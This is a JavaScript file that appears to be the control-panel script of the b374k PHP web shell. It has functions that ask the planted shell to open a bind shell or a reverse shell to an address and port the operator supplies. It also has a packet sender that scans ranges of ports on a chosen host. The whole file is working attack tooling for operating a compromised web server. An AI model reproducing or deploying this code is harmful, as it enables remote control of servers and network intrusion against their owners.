Zepto(function($){
	rs_init();

});

function rs_init(){
	if(evalReady&&(evalSupported!=null)&&(evalSupported!='')){
		splits = evalSupported.split(",");
		$.each(splits, function(i, k){
			$('.rsType').append("<option>"+k+"</option>");
		});
	}
	else setTimeout('rs_init()', 1000);

	$('#packetContent').on('keydown', function(e){
		if(e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)){
			packet_go();
		}
		fix_tabchar(this, e);
	});
}

function rs_go_bind(){
	rs_go('bind');
}
function rs_go_back(){
	rs_go('back');
}

function rs_go(rsType){
	rsArgs = "";
	if(rsType=='bind'){
		rsPort = parseInt($('#bindPort').val());
		rsLang = $('#bindLang').val();
		rsArgs = rsPort;
		rsResult = $('#bindResult');
	}
	else if(rsType=='back'){
		rsAddr = $('#backAddr').val();
		rsPort = parseInt($('#backPort').val());
		rsLang = $('#backLang').val();
		rsArgs = rsPort + ' ' + rsAddr;
		rsResult = $('#backResult');
	}

	if((isNaN(rsPort))||(rsPort<=0)||(rsPort>65535)){
		rsResult.html('Invalid port');
		return;
	}

	if(rsArgs!=''){
		send_post({ rsLang:rsLang, rsArgs:rsArgs },
			function(res){
				if(res!='error'){
					splits = res.split('{[|b374k|]}');
					if(splits.length==2){
						output = splits[0]+"<hr>"+splits[1];
						rsResult.html(output);
					}
					else{
						rsResult.html(res);
					}
				}
			}
		);
	}
}

function packet_go(){
	packetHost = $('#packetHost').val();
	packetStartPort = parseInt($('#packetStartPort').val());
	packetEndPort = parseInt($('#packetEndPort').val());
	packetTimeout = parseInt($('#packetTimeout').val());
	packetSTimeout = parseInt($('#packetSTimeout').val());
	packetContent = $('#packetContent').val();
	packetResult = $('#packetResult');
	packetStatus = $('#packetStatus');
	packetPortList = $('#packetPortList').val();

	if((isNaN(packetStartPort))||(packetStartPort<=0)||(packetStartPort>65535)){
		packetResult.html('Invalid start port');
		return;
	}
	if((isNaN(packetEndPort))||(packetEndPort<=0)||(packetEndPort>65535)){
		packetResult.html('Invalid end port');
		return;
	}
	
	if((isNaN(packetTimeout))||(packetTimeout<=0)){
		packetResult.html('Invalid connection timeout');
		return;
	}
	if((isNaN(packetSTimeout))||(packetSTimeout<=0)){
		packetResult.html('Invalid stream timeout');
		return;
	}

	if(packetStartPort>packetEndPort){
		start = packetEndPort;
		end = packetStartPort;
	}
	else{
		start = packetStartPort;
		end = packetEndPort;
	}

	if(packetPortList.length > 0) {
		packetPortList = packetPortList.split('|');
		packetPortList = packetPortList.map(function(currentValue, index, array){
			currentValue = parseInt(currentValue);
			if(!isNaN(currentValue)) {
				return currentValue;
			}
		})
	} else {
		packetPortList = [];
	}

	for (var i = start; i <= end; i++) {
		packetPortList.push(i);
	}

	packetPortList = distinct(packetPortList);
	packetResult.html('');
	for(var i in packetPortList) {
		packetPort = packetPortList[i];
		packet_send(packetHost, packetPort, packetEndPort, packetTimeout, packetSTimeout, packetContent, function(res) {
			if(!res.startsWith('false')) {
				packetResult.append(res);
			}
		});
	}
}

function packet_send(packetHost, packetPort, packetEndPort, packetTimeout, packetSTimeout, packetContent, func){
	send_post({packetHost:packetHost, packetPort:packetPort, packetEndPort:packetEndPort, packetTimeout:packetTimeout, packetSTimeout:packetSTimeout, packetContent:packetContent}, func, false);
}

function distinct(arr) {
    var ret = [],
        json = {},
        length = arr.length;
        
    for(var i = 0; i < length; i++){
        var val = arr[i];
        if(!json[val]){
            json[val] = 1;
            ret.push(val);
        }
    }
    return ret;
}